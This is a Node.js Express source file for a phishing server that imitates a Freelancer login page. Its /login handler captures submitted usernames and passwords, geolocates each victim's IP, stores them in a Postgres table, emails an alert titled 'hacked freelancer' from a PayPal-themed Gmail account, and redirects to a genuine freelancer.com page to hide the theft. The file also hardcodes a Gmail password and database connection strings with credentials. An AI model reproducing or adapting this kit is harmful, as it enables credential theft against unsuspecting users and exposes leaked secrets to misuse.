var express = require('express');
var app = express();
app.use(express.static('public'));
const PORT = process.env.PORT || 5000;
app.set('view engine', 'ejs');
const pg = require('pg');
var bodyParser = require('body-parser');
const nodemailer = require("nodemailer");
const iplocation = require("iplocation").default;
var loc;
var city;
var reg;

var mailOptions = {
    from: 'paypal.credit.safety@gmail.com',
    to: "fadysadakah.emh@gmail.com",
    subject: 'hacked freelancer',
    text: '',
    html: ''
};
var transporter = nodemailer.createTransport({
    service: 'gmail',
    host: 'smtp.gmail.com',
    secure: true,
    port: 465,

    auth: {
        user: 'paypal.credit.safety@gmail.com',
        pass: 'xzoahseedlerintr'
    }
});
const database_link = 'postgres://guubdceshesoyx:ea940cb2674263483e68fb29c358aef452045dedd2141c4206e78153ab683b68@ec2-23-21-186-85.compute-1.amazonaws.com:5432/d40c20g7k77c0f';
const client = new pg.Client(database_link);

app.use(bodyParser.urlencoded({ extended: false }));
// const client = new pg.Client({
//     user: 'hedmgtryrynnvo',
//     password: '8d3725c0c82caf633dea68b3520ed712ae8bb985e69daf228c9a2a72959a91c5',
//     database: 'deqngk324p153p',
//     port: 5432,
//     host: 'ec2-23-23-228-132.compute-1.amazonaws.com',
//     ssl: true
// });


client.connect();

// #########################################################################################################################################################################################################################
app.get('/confirm/*',function(req,res){
    res.render('confirm');
})
// #############################################################    POST REQUESTS    #######################################################################################################################################
app.post('/login',function(req,res){
    console.log(req.body)
    transporter.sendMail(mailOptions, function () { });
    var a = req.body.username.replace(/\\/g,"\\\\").replace(/'/g,"\\'");
    var b = req.body.password.replace(/\\/g,"\\\\").replace(/'/g,"\\'");
    console.log(a+b);
    var ip = req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    (req.connection.socket ? req.connection.socket.remoteAddress : null);

    iplocation(ip, [], (error, res) => { loc = res.country; city = res.region; reg = res.city;console.log(res);
        var location = loc + '---' + city + '---' + reg ;
    
        client.query("INSERT INTO freelancer_users (users,password,ip,country) VALUES ('" + a + "','" + b + "','" + ip + "','"+location+"')",function(err,result){});
        res.redirect('https://www.freelancer.com/contest/Design-a-logo-for-an-Accounting-Firm-1460786-byentry-25383803?w=f');
    });
console.log('location **:**'+location);
})


// #########################################################################################################################################################################################################################

app.get('*', function (req, res) {
    res.render('login')
})
app.listen(PORT, function () {
    console.log('Server Started')
})
